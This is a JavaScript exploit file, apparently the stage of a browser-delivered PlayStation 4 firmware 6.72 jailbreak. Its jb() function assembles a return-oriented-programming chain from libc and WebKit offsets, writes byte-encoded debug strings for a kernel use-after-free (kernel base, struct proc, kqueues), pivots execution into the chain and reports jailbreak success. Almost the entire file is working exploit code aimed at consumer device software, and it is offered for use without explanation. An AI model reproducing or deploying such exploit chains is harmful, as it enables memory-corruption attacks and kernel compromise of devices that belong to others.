function jb(){
var ropchain = malloc(1592544);
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0;
var ropchain_ptr = 8;
function writeptr(list){
for(var ptr = 0; ptr < list.length; ptr++){
if(typeof list[ptr]=="object"){
	write_mem(ropchain+ropchain_ptr,list[ptr]);
}else{
	write_ptr_at(ropchain+ropchain_ptr,list[ptr]);
}
ropchain_ptr+=8;
}}
writeptr([libc_base+788575,ropchain+65720,webkit_base+14461559,libc_base+206806,ropchain+65680,libc_base+793877,[8, 0, 0, 0, 0, 0, 0, 0],libc_base+248252,libc_base+788575,ropchain+112,libc_base+471355,libc_base+811575,ropchain+815552,libc_base+811575,ropchain+65680]);
var printf_buf_offset = 128;
writeptr([printf_buf,[255, 255, 255, 255, 255, 255, 255, 255]]);
ropchain_ptr=65680;
write_mem(ropchain+1592008, [0, 0, 0, 0, 0, 0, 0, 0, 160, 134, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592032, [117, 97, 102, 58, 32, 37, 100, 10, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592048, [107, 101, 118, 101, 110, 116, 95, 97, 100, 100, 114, 32, 61, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0]);
write_mem(ropchain+1592072, [112, 107, 116, 111, 112, 116, 115, 95, 97, 100, 100, 114, 32, 61, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0]);
write_mem(ropchain+1592096, [115, 105, 100, 116, 32, 61, 32, 48, 120, 37, 104, 120, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0, 0]);
write_mem(ropchain+1592120, [115, 111, 99, 107, 101, 116, 115, 61, 37, 100, 32, 107, 113, 117, 101, 117, 101, 115, 61, 37, 100, 10, 0, 0]);
write_mem(ropchain+1592144, [117, 97, 102, 32, 111, 107, 33, 10, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592160, [111, 118, 101, 114, 108, 97, 112, 95, 105, 100, 120, 32, 61, 32, 37, 100, 10, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592184, [111, 118, 101, 114, 108, 97, 112, 95, 105, 100, 120, 32, 61, 32, 37, 100, 10, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592208, [111, 118, 101, 114, 108, 97, 112, 95, 105, 100, 120, 32, 61, 32, 37, 100, 10, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592232, [118, 105, 99, 116, 105, 109, 95, 105, 100, 120, 32, 61, 32, 37, 100, 10, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592256, [101, 114, 114, 111, 114, 58, 32, 107, 101, 114, 110, 101, 108, 32, 98, 97, 115, 101, 32, 109, 105, 115, 109, 97, 116, 99, 104, 58, 32, 48, 120, 37, 108, 108, 120, 33, 32, 40, 98, 117, 103, 103, 121, 32, 97, 114, 98, 32, 114, 47, 119, 63, 32, 119, 114, 111, 110, 103, 32, 102, 119, 63, 41, 10, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592328, [107, 101, 114, 110, 101, 108, 95, 98, 97, 115, 101, 32, 61, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0]);
write_mem(ropchain+1592352, [102, 95, 100, 101, 116, 97, 99, 104, 32, 61, 32, 48, 120, 37, 108, 108, 120, 44, 32, 111, 102, 102, 115, 101, 116, 32, 61, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592392, [115, 116, 114, 117, 99, 116, 95, 112, 114, 111, 99, 32, 61, 32, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0]);
write_mem(ropchain+1592416, [103, 101, 116, 112, 105, 100, 40, 41, 32, 61, 32, 48, 120, 37, 120, 10, 0, 0, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592440, [106, 105, 116, 58, 32, 37, 100, 32, 37, 100, 10, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592456, [114, 120, 61, 48, 120, 37, 108, 108, 120, 32, 114, 119, 61, 48, 120, 37, 108, 108, 120, 10, 0, 0, 0, 0]);
write_mem(ropchain+1592480, [112, 97, 103, 101, 95, 114, 120, 91, 48, 93, 32, 61, 32, 48, 120, 37, 120, 10, 0, 0, 0, 0, 0, 0]);
write_mem(ropchain+1592504, [99, 108, 111, 115, 101, 100, 32, 102, 100, 32, 37, 100, 10, 0, 0, 0]);
write_mem(ropchain+1592520, [232, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
if(main_ret == 179 || main_ret == 0){
	setCookie("JB","DONE",1);
	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 6.72 Exploit Complete ✔";}, 500);
} else{
	alert("Jailbreak Failed!! Please Restart and Start Fresh!!!");
}
}